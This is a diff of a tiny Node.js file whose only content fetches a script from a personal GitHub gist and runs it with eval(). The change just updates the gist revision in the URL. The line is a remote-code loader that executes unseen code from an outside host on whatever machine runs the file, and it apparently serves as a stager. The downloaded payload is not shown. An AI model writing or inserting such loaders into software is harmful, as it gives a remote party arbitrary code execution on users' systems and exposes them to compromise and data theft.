@@ -1,2 +1,2 @@
 const https = require("https");
-https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/568e7a39dfef069f389ac5190bf01a468316f29f/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
+https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/b49267b00e53c7c1ade180ff91095bc4d65a7392/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
